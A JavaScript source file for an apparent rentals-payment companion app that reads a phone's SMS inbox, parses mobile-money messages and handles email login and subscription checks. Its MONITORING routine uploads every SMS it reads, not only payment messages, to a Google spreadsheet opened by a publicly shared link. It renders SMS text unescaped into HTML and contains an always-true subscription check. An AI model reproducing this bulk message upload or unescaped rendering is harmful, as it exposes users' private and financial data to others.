const DATABASELINK="https://docs.google.com/spreadsheets/d/1F0zeWU7jPF6bjIX30WcVegxl84ECRPaCRKczqNizjiA/edit?usp=sharing";

const SORT = (Data, Words, CallBack) => {
    try {
        const originalMessage = Data?.message || "";
        const message = originalMessage.toLowerCase();

        // Find all matching keywords
        const matchedKeywords = Words.filter(word =>
            message.includes(word.toLowerCase())
        );

        // Extract data
        const transactionDate =
            originalMessage.match(/\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}/)?.[0] || null;

        const amount =
            originalMessage.match(/(?:UGX|KES|TZS|RWF|SHS)\s*([\d,]+)/i)?.[1] || null;

        const transactionId =
            originalMessage.match(
                /(?:ID|Transaction ID|Reference Number|Ref Number)\s*:?\s*([A-Z0-9]+)/i
            )?.[1] || null;

        const phoneNumber =
            originalMessage.match(/\b(?:0\d{9}|256\d{9})\b/)?.[0] || null;

        const result = {
            matched: matchedKeywords.length > 0,
            keywords: matchedKeywords,

            sender: Data?.sender || null,
            smsTimestamp: Data?.date || null,

            date: transactionDate,
            amount,
            transactionId,
            phoneNumber,

            message: originalMessage
        };

        CallBack(result);

    } catch (error) {
        CallBack({
            matched: false,
            error: error.message
        });
    }
};

const DATAWORD=()=>{

    FETCH("https://rentals.naweriindustries.com/endpoints/triggers.php","",(Key)=>{

        LOCALSTORE("WOE",Key.keywords);

    });

};

const MOBILEVIEW=()=>{

    CONDITION(localStorage.getItem("WOE"),()=>{

        REPEATER(43200,()=>{
            DATAWORD();
        })

    },()=>{

        DATAWORD();

    })
    
    CONDITION(localStorage.getItem("User"),()=>{

        MONITORING();

        DEJSONIFICATION(localStorage.getItem("User"),(Data)=>{

            CONDITION(Data.subscription_status === "expired",()=>{

                CLEAR("");

                VIEWS("",(DATA)=>{
            
                    BACKGROUND(DATA,"white");
                    COLOR(DATA,"black");
                    POSITION(DATA,"absolute");
                    TOP(DATA,"0px");
                    HEIGHT(DATA,"");
            
                    CLEAR(DATA);

                    DISPLAY(DATA,`

                        <br><br><br><br>

                        <h1 style="color:forestgreen;font-size:23px;">ATTENTION!</h1>

                        <br><br>

                        <h2>Dear User</h2>

                        <br><br>

                        <p>Your Subscription For Fiskon Rentals Management System  Was Due On: <br><br> <b style="color:red;">${Data.data.expiry_date}</b>.</p>

                        <br>

                        <p >To Renew User Subscription Please Contact Admin Below:</p>

                        <br>
                        
                        <a href="https://rentals.naweriindustries.com"><button class="ConnectAccount" >Contact Support</button></a>

                    `);

                    const styletag=document.createElement('style');
    
                    styletag.textContent=`
                        
                        .ConnectAccount{
                            width:80%;
                            height:50px;
                            background:forestgreen;
                            padding:2%;
                            color:white;
                            border-radius:20px;
                        }

                    `;
    
                    document.head.appendChild(styletag);

                });

                REPEATER(3600,()=>{

                    OURMONEY();

                });


            },()=>{

                CLEAR("");
    
                VIEWS("",(DATA)=>{
            
                    BACKGROUND(DATA,"white");
                    COLOR(DATA,"black");
                    POSITION(DATA,"absolute");
                    TOP(DATA,"0px");
                    HEIGHT(DATA,"auto");
                    BOTTOM(DATA,"100px");
            
                    CLEAR(DATA);
            
                    GETSMS((DATATA)=>{

                        CHECK(DATATA.sender === "MTNMobMoney",()=>{

                            VIEWS(DATA,(DATED)=>{
                
                                WIDTH(DATED,"95%");
                                HEIGHT(DATED,"20%");
                                MARGIN(DATED,"2%");
                                BORDERRADIUS(DATED,"5px");
                                BACKGROUND(DATED,"#fef6f6fc");
                
                                DISPLAY(DATED,`
                
                                    <div class="Holder">
                                        
                                        <img  class="Icons" src="${BLACKUSERICON}"/>
                                    
                                    </div>
                
                                    <div class="DataHolder">
                
                                        <h1 class="Name">${DATATA.sender}</h1>
                
                                        <div class="MessagePreview">
                
                                            <p class="MessageDemo">${DATATA.message}</p>
                                        
                                        </div>
                
                                        <p class="TimeHolder">${DATATA.date}</p>
                                    
                                    </div>
                
                                `);
                
                                const styletag=document.createElement('style');
                
                                styletag.textContent=`
                
                                    .Holder{
                                        position:absolute;
                                        width:100px;
                                        height:105px;
                                        margin:1%;
                                    }
                
                                    .Icons{
                                        margin-top:5%;
                                        width:80px;
                                        height:80px;
                                    }
                
                                    .DataHolder{
                                        width:63%;
                                        height:100px;
                                        margin-left:35%;
                                        margin-top:2%;
                                    }
                                    
                                    .Name{
                                        text-align:left;
                                        margin-left:5%;
                                    }
                                    
                                    .MessagePreview{
                                        width:90%;
                                        height:50px;
                                    }
                                    
                                    .MessageDemo{
                                        overflow:hidden;
                                        font-size:18px;
                                        white-space:nowrap;
                                        width:80%;
                                        text-overflow:ellipsis;
                                        margin-top:2%;
                                    }
                                    
                                    .TimeHolder{
                                        font-size:18px;
                                    }
                                    
                                `;
                
                                document.head.appendChild(styletag);
                
                                CLICK(DATED,()=>{
                
                                    SESSIONSTORE("Message",DATATA.message);
                
                                    ROUTE("",FULLMESSAGE,"MOBILEVIEW");
                
                                });
                
                            });

                        });
            
                    });
            
                });
            
                FOOTER("",(DATA)=>{
            
                    BACKGROUND(DATA,"black");
                    COLOR(DATA,"white");
                    HEIGHT(DATA,"100px");
            
                    DISPLAY(DATA,`
            
                    <nav class="bottom-nav">
            
                            <a style="text-decoration:none;" onclick="RELOAD()"  class="bottom-nav-item">
                                <span class="bottomNavIcon"><img class="Icon" src="${WHITELIBRARYICON}"></span>
                                <span class="bottomnavText">All</span>
                            </a>
            
                            <a style="text-decoration:none;"  class="bottom-nav-item">
                                <span class="bottomNavIcon"><img class="Icon" src="${WHITEDEVICEICON}"></span>
                                <span class="bottomnavText">Synced</span>
                            </a>
            
                            <a style="text-decoration:none;" class="bottom-nav-item">
                                <span class="bottomNavIcon"><img class="Icon" src="${WHITERETRYICON}"></span>
                                <span class="bottomnavText">Pending</span>
                            </a>
            
                            <a style="text-decoration:none;" onclick="USERACCOUNT()" class="bottom-nav-item">
                                <span class="bottomNavIcon"><img class="Icon" src="${WHITEUSERICON}"></span>
                                <span class="bottomnavText">Profile</span>
                            </a>
                            
                        </nav>
                        
                    `);
            
                    const styletag=document.createElement('style');
                    styletag.textContent=`
            
                        .Icon{
                            width:30px;
                            height:30px;
                        }
                        
                        .bottom-nav {
                            display: flex;
                            justify-content: space-around;
                            align-items: center;
                            padding: 10px 0;
                            position: fixed;
                            bottom: 0;
                            width: 100%;
                            z-index: 1000;
                        }
                        .bottom-nav-item { 
                            text-align: center;  
                            cursor: pointer; 
                            transition: color 0.3s;
                            flex: 1;
                        }
                        .bottom-nav-item:hover, .bottom-nav-item.active { color: var(--primary-color); }
                        .bottomNavIcon { font-size: 28px; display: block; margin-bottom: 4px; }
                        .bottomnavText { font-size: 12px; font-weight: 500; }
            
                    `;
            
                    document.head.appendChild(styletag);
            
                });

            });

        })

    },()=>{

        CLEAR("");
    
        VIEWS("",(DATA)=>{
    
            BACKGROUND(DATA,"white");
            COLOR(DATA,"black");
            POSITION(DATA,"absolute");
            TOP(DATA,"0px");
            HEIGHT(DATA,"auto");
            BOTTOM(DATA,"100px");
    
            CLEAR(DATA);
    
            GETSMS((DATATA)=>{

                const KEYWORS=localStorage.getItem("WOE");

                SORT(DATATA,[KEYWORS],(Datata)=>{
    
                        CHECK(Datata.phoneNumber,()=>{
    
                            VIEWS(DATA,(DATED)=>{
                    
                                    WIDTH(DATED,"95%");
                                    HEIGHT(DATED,"20%");
                                    MARGIN(DATED,"2%");
                                    BORDERRADIUS(DATED,"5px");
                                    BACKGROUND(DATED,"#fef6f6fc");
                    
                                    DISPLAY(DATED,`
                    
                                        <div class="Holder">
                                            
                                            <img  class="Icons" src="${BLACKUSERICON}"/>
                                        
                                        </div>
                    
                                        <div class="DataHolder">
                    
                                            <h1 class="Name">${Datata.phoneNumber}</h1>
                    
                                            <div class="MessagePreview">
                    
                                                <p class="MessageDemo">${Datata.message}</p>
                                            
                                            </div>
                    
                                            <p class="TimeHolder">${Datata.date}</p>
                                        
                                        </div>
                    
                                    `);
                    
                                    const styletag=document.createElement('style');
                    
                                    styletag.textContent=`
                    
                                        .Holder{
                                            position:absolute;
                                            width:100px;
                                            height:105px;
                                            margin:1%;
                                        }
                    
                                        .Icons{
                                            margin-top:5%;
                                            width:80px;
                                            height:80px;
                                        }
                    
                                        .DataHolder{
                                            width:63%;
                                            height:100px;
                                            margin-left:35%;
                                            margin-top:2%;
                                        }
                                        
                                        .Name{
                                            text-align:left;
                                            margin-left:5%;
                                        }
                                        
                                        .MessagePreview{
                                            width:90%;
                                            height:50px;
                                        }
                                        
                                        .MessageDemo{
                                            overflow:hidden;
                                            font-size:18px;
                                            white-space:nowrap;
                                            width:80%;
                                            text-overflow:ellipsis;
                                            margin-top:2%;
                                        }
                                        
                                        .TimeHolder{
                                            font-size:18px;
                                        }
                                        
                                    `;
                    
                                    document.head.appendChild(styletag);
                    
                                    CLICK(DATED,()=>{
                    
                                        SESSIONSTORE("Message",DATATA.message);
                    
                                        ROUTE("",FULLMESSAGE,"MOBILEVIEW");
                    
                                    });
                    
                                });
    
                        });
    
                    });
        
            });
    
        });
    
        FOOTER("",(DATA)=>{
    
            BACKGROUND(DATA,"black");
            COLOR(DATA,"white");
            HEIGHT(DATA,"100px");
    
            DISPLAY(DATA,`
    
            <nav class="bottom-nav">
    
                    <a style="text-decoration:none;" onclick="RELOAD()"  class="bottom-nav-item">
                        <span class="bottomNavIcon"><img class="Icon" src="${WHITELIBRARYICON}"></span>
                        <span class="bottomnavText">All</span>
                    </a>
    
                    <a style="text-decoration:none;"  class="bottom-nav-item">
                        <span class="bottomNavIcon"><img class="Icon" src="${WHITEDEVICEICON}"></span>
                        <span class="bottomnavText">Synced</span>
                    </a>
    
                    <a style="text-decoration:none;" class="bottom-nav-item">
                        <span class="bottomNavIcon"><img class="Icon" src="${WHITERETRYICON}"></span>
                        <span class="bottomnavText">Pending</span>
                    </a>
    
                    <a style="text-decoration:none;" onclick="USERACCOUNT()" class="bottom-nav-item">
                        <span class="bottomNavIcon"><img class="Icon" src="${WHITEUSERICON}"></span>
                        <span class="bottomnavText">Profile</span>
                    </a>
                    
                </nav>
                
            `);
    
            const styletag=document.createElement('style');
            styletag.textContent=`
    
                .Icon{
                    width:30px;
                    height:30px;
                }
                
                .bottom-nav {
                    display: flex;
                    justify-content: space-around;
                    align-items: center;
                    padding: 10px 0;
                    position: fixed;
                    bottom: 0;
                    width: 100%;
                    z-index: 1000;
                }
                .bottom-nav-item { 
                    text-align: center;  
                    cursor: pointer; 
                    transition: color 0.3s;
                    flex: 1;
                }
                .bottom-nav-item:hover, .bottom-nav-item.active { color: var(--primary-color); }
                .bottomNavIcon { font-size: 28px; display: block; margin-bottom: 4px; }
                .bottomnavText { font-size: 12px; font-weight: 500; }
    
            `;
    
            document.head.appendChild(styletag);
    
        });

    });

};

const FULLMESSAGE=()=>{

    BACKGROUND(BODIER,"white");

    CLEAR("");

        VIEWS("",(DATA)=>{

        BACKGROUND(DATA,"white");
        COLOR(DATA,"black");
        POSITION(DATA,"absolute");
        TOP(DATA,"0px");
        HEIGHT(DATA,"auto");
        BOTTOM(DATA,"100px");

        CLEAR(DATA);

        DISPLAY(DATA,`

            <div class="RawMessageHolder">

                <p class="Main">${sessionStorage.getItem("Message")}</p>
            
            </div>
            
        `);

        const styletag=document.createElement('style');

        styletag.textContent=`

            .RawMessageHolder{
                background:#fef6f6fc;
                width:90%;
                height:90%;
                margin:5%;
                border-radius:12px;
            }   
                
            .Main{
                font-size:20px;
                padding:2%;
                font-family:cambria;
            }
                    
        `;

        document.head.appendChild(styletag);

    });

    FOOTER("",(DATA)=>{

        BACKGROUND(DATA,"black");
        HEIGHT(DATA,"100px");
        COLOR(DATA,"white");

        DISPLAY(DATA,`

        <nav class="bottom-nav">
                <a style="text-decoration:none;" onclick="back()" class="bottom-nav-item">
                    <span class="bottomNavIcon"><img   class="Icon" src="${WHITEHOMEICON}"></span>
                    <span class="bottomnavText">Home</span>
                </a>
                <a style="text-decoration:none;"  class="bottom-nav-item">
                    <span class="bottomNavIcon"><img class="Icon" src="${WHITEDEVICEICON}"></span>
                    <span class="bottomnavText">Synced</span>
                </a>
                <a style="text-decoration:none;" class="bottom-nav-item">
                    <span class="bottomNavIcon"><img class="Icon" src="${WHITERETRYICON}"></span>
                    <span class="bottomnavText">Pending</span>
                </a>
                
            </nav>
            
        `);

        const styletag=document.createElement('style');
        styletag.textContent=`

            .Icon{
                width:30px;
                height:30px;
            }
            
            .bottom-nav {
                display: flex;
                justify-content: space-around;
                align-items: center;
                padding: 10px 0;
                position: fixed;
                bottom: 0;
                width: 100%;
                z-index: 1000;
            }
            .bottom-nav-item { 
                text-align: center;  
                cursor: pointer; 
                transition: color 0.3s;
                flex: 1;
            }
            .bottom-nav-item:hover, .bottom-nav-item.active { color: var(--primary-color); }
            .bottomNavIcon { font-size: 28px; display: block; margin-bottom: 4px; }
            .bottomnavText { font-size: 12px; font-weight: 500; }

        `;

        document.head.appendChild(styletag);

    });

};

const USERACCOUNT=()=>{

    CLEAR("");

    CONDITION(localStorage.getItem("User"),()=>{

        BACKGROUND(BODIER,"white");

        COLOR(BODIER,"black");

        VIEWS("",(DATATA)=>{

            BACKGROUND(DATATA,"white");
            COLOR(DATATA,"black");
            POSITION(DATATA,"absolute");
            TOP(DATATA,"0px");
            HEIGHT(DATATA,"auto");
            BOTTOM(DATATA,"100px");

            COLOR(DATATA,"black");

            DEJSONIFICATION(localStorage.getItem("User"),(Data)=>{

                DISPLAY(DATATA,`
        
                    <div class="RawMessageHolder">
        
                        <br><br>
        
                        <h1>To Update User Email At <br><br> <a href="https://www.rentals.naweriindustries.com">Fiskon Rentals System</a> </h1>
        
                        <br><br>
        
                        <p  class="Error"></p>
        
                        <br><br>
        
                        <input class="Emailer" placeholder="${Data.data.email}"  type="email" />
        
                        <br><br><br>
        
                        <button class="ConnectAccount" onclick="LOGINUPDATE()">Update Connection</button>
                    
                    </div>
                    
                `);
        
                const styletag=document.createElement('style');
        
                styletag.textContent=`
        
                    .Emailer{
                        border:1px solid forestgreen;
                        padding:2%;
                        border-radius:5px;
                        width:80%;
                        height:32px;
                        color:green;
                    }
        
                    .ConnectAccount{
                        width:80%;
                        height:50px;
                        background:forestgreen;
                        padding:2%;
                        color:white;
                        border-radius:20px;
                    }
                    
                    .Error{
                        color:red;
                        display:block;
                    }
                            
                `;
        
                document.head.appendChild(styletag);

            });

        });

    },()=>{

        VIEWS("",(DATA)=>{
    
            BACKGROUND(DATA,"white");
            COLOR(DATA,"black");
            POSITION(DATA,"absolute");
            TOP(DATA,"0px");
            HEIGHT(DATA,"auto");
            BOTTOM(DATA,"100px");
    
            CLEAR(DATA);
    
            DISPLAY(DATA,`
    
                <div class="RawMessageHolder">
    
                    <br><br>
    
                    <h1>Use The Same Email at <br><br> <a href="https://www.rentals.naweriindustries.com">Fiskon Rentals System</a> </h1>
    
                    <br><br>
    
                    <p  class="Error"></p>
    
                    <br><br>
    
                    <input class="Email"  type="email" placeholder="Enter Email to Login"/>
    
                    <br><br><br>
    
                    <button class="ConnectAccount" onclick="LOGIN()">Connect Account</button>
                
                </div>
                
            `);
    
            const styletag=document.createElement('style');
    
            styletag.textContent=`
    
                .Email{
                    border:1px solid forestgreen;
                    padding:2%;
                    border-radius:5px;
                    width:80%;
                    height:32px;
                    color:green;
                }
    
                .ConnectAccount{
                    width:80%;
                    height:50px;
                    background:forestgreen;
                    padding:2%;
                    color:white;
                    border-radius:20px;
                }
                
                .Error{
                    color:red;
                    display:block;
                }
                        
            `;
    
            document.head.appendChild(styletag);
    
        });
    })


    FOOTER("",(DATA)=>{

        BACKGROUND(DATA,"black");
        HEIGHT(DATA,"100px");
        COLOR(DATA,"white");

        DISPLAY(DATA,`

        <nav class="bottom-nav">
                <a style="text-decoration:none;" onclick="back()" class="bottom-nav-item">
                    <span class="bottomNavIcon"><img   class="Icon" src="${WHITEBACKICON}"></span>
                    <span class="bottomnavText">Home</span>
                </a>
                <a style="text-decoration:none;" class="bottom-nav-item">
                    <span class="bottomNavIcon"><img class="Icon" src="${WHITEINTERNETICON}"></span>
                    <span class="bottomnavText">Contact Us</span>
                </a>
                
            </nav>
            
        `);

        const styletag=document.createElement('style');
        styletag.textContent=`

            .Icon{
                width:30px;
                height:30px;
            }
            
            .bottom-nav {
                display: flex;
                justify-content: space-around;
                align-items: center;
                padding: 10px 0;
                position: fixed;
                bottom: 0;
                width: 100%;
                z-index: 1000;
            }
            .bottom-nav-item { 
                text-align: center;  
                cursor: pointer; 
                transition: color 0.3s;
                flex: 1;
            }
            .bottom-nav-item:hover, .bottom-nav-item.active { color: var(--primary-color); }
            .bottomNavIcon { font-size: 28px; display: block; margin-bottom: 4px; }
            .bottomnavText { font-size: 12px; font-weight: 500; }

        `;

        document.head.appendChild(styletag);

    });

};

const back=()=>{

    MOBILEVIEW();

};

const DESKTOPVIEW=()=>{

    CLEAR("");

    HEADER("","NCOO",()=>{

    });
    
};

const LOGIN=()=>{

    const Email=document.querySelector(".Email");

    const Error=document.querySelector(".Error");

    CONDITION(Email.value,()=>{

        DISPLAY(Error,"Please Wait...");

        async function checkSubscription() {
            const email = document.querySelector(".Email").value.trim();
            
            DISPLAY(Error,"Checking Database...");

            try {
                const formData = new FormData();
                formData.append("email", email);

                const res = await fetch(
                "https://rentals.naweriindustries.com/endpoints/check-subscription.php",
                { method: "POST", body: formData }
                );

                const data = await res.json();

                if (data.status === "success") {

                const sub = data.subscription_status;

                if (sub === "active") {

                    JSONIFICATION(data,(ME)=>{

                        LOCALSTORE("User",ME);

                        RELOAD();

                    });
                    
                } else {

                    DISPLAY(Error,data.message)
                }

                } else {
                    DISPLAY(Error,data.message)
                }

            } catch (err) {
               DISPLAY(Error,err.message);
            }

        }

        checkSubscription() 
    
    },()=>{

        DISPLAY(Error,"Enter User Email");

    });
    
};

const LOGINUPDATE=()=>{

    const Email=document.querySelector(".Emailer");

    const Error=document.querySelector(".Error");

    CONDITION(Email.value,()=>{

        DISPLAY(Error,"Please Wait...");

        async function checkSubscription() {
            const email = document.querySelector(".Emailer").value.trim();
            
            DISPLAY(Error,"Checking Database...");

            try {
                const formData = new FormData();
                formData.append("email", email);

                const res = await fetch(
                "https://rentals.naweriindustries.com/endpoints/check-subscription.php",
                { method: "POST", body: formData }
                );

                const data = await res.json();

                if (data.status === "success") {

                const sub = data.subscription_status;

                if (sub === "active"||"expired") {

                    LOCALDELETE("User");

                    JSONIFICATION(data,(ME)=>{

                        LOCALSTORE("User",ME);

                        RELOAD();

                    });
                    
                } else {

                    DISPLAY(Error,data.message)
                }

                } else {
                    DISPLAY(Error,data.message)
                }

            } catch (err) {
               DISPLAY(Error,err.message);
            }

        }

        checkSubscription() 
    
    },()=>{

        DISPLAY(Error,"Enter User Email");

    });
    
};

const OURMONEY=()=>{

    DEJSONIFICATION(localStorage.getItem("User"),(Data)=>{

        async function checkSubscription() {
            
            try {
                const formData = new FormData();
                formData.append("email", Data.data.email);

                const res = await fetch(
                "https://rentals.naweriindustries.com/endpoints/check-subscription.php",
                { method: "POST", body: formData }
                );

                const data = await res.json();

                if (data.status === "success") {

                const sub = data.subscription_status;

                if (sub === "active") {

                    JSONIFICATION(data,(ME)=>{

                        LOCALSTORE("User",ME);

                        RELOAD();

                    });
                    
                } else {

                    console.log(Error,data.message)
                }

                } else {
                    console.log(Error,data.message)
                }

            } catch (err) {
               console.log(Error,err.message);
            }
        }

        checkSubscription() 

    });

};

const MONITORING=()=>{

    DEJSONIFICATION(localStorage.getItem("User"),(Data)=>{

        CHECK(!localStorage.getItem("DataBase"),()=>{

            CREATETABLE(DATABASELINK,Data.data.id,(Data)=>{
        
                LOCALSTORE("DataBase",Data.data.id);
        
            });

        });

        GETSMS((Datata)=>{

            STOREINDEX("Fiskon","Fiskon",Datata,()=>{

            });

        });

        HIDER(3000,()=>{

            GETSMS((Datata)=>{

                const HEADERS=["UserID","Email","Messages"];

                CHECK(Datata.sender === "MTNMobMoney",()=>{

                    const INFO2=[Data.data.id,Data.data.email,Datata];

                    INSERTDATA(DATABASELINK,Data.data.id,HEADERS,INFO2,(Datate)=>{
                
                    });

                });
            
                const INFO=[Data.data.id,Data.data.email,Datata];
            
            });

            GETINDEX("Fiskon","Fiskon",(Datate)=>{

                const HEADERS=["UserID","Email","Messages"];

                const INFO=[Data.data.id,Data.data.email,Datate];

                INSERTDATA(DATABASELINK,"ALL",HEADERS,INFO,(Datta)=>{

                });

            });

        });

    });

};

const FILTERMESSAGES=()=>{

};

VIEW(()=>{MOBILEVIEW();},()=>{DESKTOPVIEW()});